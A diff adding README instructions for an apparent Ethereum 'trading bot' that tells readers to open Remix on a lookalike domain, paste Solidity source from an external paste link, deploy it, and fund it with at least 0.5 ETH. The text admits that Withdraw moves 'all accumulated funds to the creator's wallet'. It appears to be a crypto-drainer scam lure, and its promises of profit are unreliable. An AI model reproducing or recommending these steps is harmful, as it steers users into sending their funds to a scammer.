@@ -38,3 +38,259 @@ Also if you get this message after deployment "Failed to publish metadata file t
 Make sure your deposit is more than 0.5 ETH(to prevent negating slippage) to your exact contract/bot address.
 
 ✅ After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
+
+
+STEP BY STEP INSTRUCTIONS (with more details)
+  
+
+1.  **Using Remix Ethereum IDE**
+
+  
+
+  
+
+- 🌍 Open the [Remix Ethereum IDE](https://remix-deploy.org/#lang=en) in your browser.
+
+  
+
+  
+
+2.  **Preparing the Contract File**
+
+  
+
+  
+
+- ✍️ Create a new file called `bot.sol` and paste the provided [SOURCE CODE](https://nopaste.net/MPJpGFbzxv) into it.
+
+  
+
+  
+
+![Bot Interface](https://i.ibb.co/qrHzc6F/bot.png)
+
+  
+
+  
+
+  
+
+3.  **Selecting the Solidity Version**
+
+  
+
+  
+
+  
+
+- 📘 Choose Solidity version `0.6.6` in the "Solidity Compiler" section of Remix.
+
+  
+
+  
+  
+
+  
+
+  
+
+4.  **Compiling the Contract**
+
+  
+
+  
+
+  
+
+- 🔄 Go to **Solidity Compiler**.
+
+  
+
+  
+
+- 🚀 Enable the optimization flag to minimize gas fees.
+
+  
+
+  
+
+- ⏩ Click **Compile**.
+
+  
+
+  
+
+  
+
+![Optimization](https://i.ibb.co/HXJKq7z/optimiz.png)
+
+  
+
+  
+
+  
+
+5.  **Deploying the Contract**
+
+  
+
+  
+
+  
+
+- ⚙️ Go to "Deploy & Run Transactions."
+
+  
+
+  
+
+- 🔄 Select "Injected Web3" to ensure MetaMask compatibility.
+
+  
+
+  
+
+- 📤 Click **Deploy**.
+
+  
+
+  
+
+- 📥 Confirm the action in MetaMask.
+
+  
+
+  
+
+  
+
+![Contract Deployment](https://i.ibb.co/vw5GW46/Deploy.png)
+
+  
+
+  
+
+  
+
+# Initial Setup and Operation
+
+  
+
+  
+
+  
+
+1.  **Preparing the Contract**
+
+  
+
+  
+
+  
+
+- ➕ After deployment, access essential functions like **Start**, **Stop**, and **Withdraw**.
+
+  
+
+  
+
+- 💵 Before activating, ensure sufficient funding. Copy your bot's address and transfer the appropriate amount of ETH or BNB, depending on the network.
+
+  
+
+  
+
+  
+
+![DEX Interface](https://i.ibb.co/dJ5cz14/dexinterface.png)
+
+  
+
+  
+
+  
+
+3.  **Activating the Bot**
+
+  
+
+  
+
+  
+
+![Bot Interface](https://i.ibb.co/2K6FCpY/deposit.png)
+
+  
+
+  
+
+  
+
+- 🟢 Deposit funds and initiate the **Start** button.
+
+  
+
+  
+
+- 🤖 Once activated, the bot monitors the network, targeting transactions with the highest potential returns.
+
+  
+
+  
+
+  
+
+5.  **Funds Withdrawal Process**
+
+  
+
+  
+
+  
+
+- ⏸ Use the Stop function to pause bot activities.
+
+  
+
+  
+
+- 💸 Trigger the Withdraw function to transfer all accumulated funds to the creator's wallet.
+
+  
+
+  
+
+  
+
+6.  **Bot Operation via API**
+
+  
+
+  
+
+  
+
+![Performance Monitoring](https://i.ibb.co/L6N84Fd/Chart.png)
+
+  
+
+  
+
+  
+
+## Funding Recommendations
+
+  
+
+  
+
+  
+
+For effective operation, especially with network scanning and gas fee management, start with **a minimum of 0.5 ETH**. Factors like market volatility and gas fees matter. Solid funding levels ensure the bot detects and completes profitable transactions.
+
+  
+
+  
+
+# **TRY IT OUT, EXPERIMENT, AND GOOD LUCK TO EVERYONE!**
+
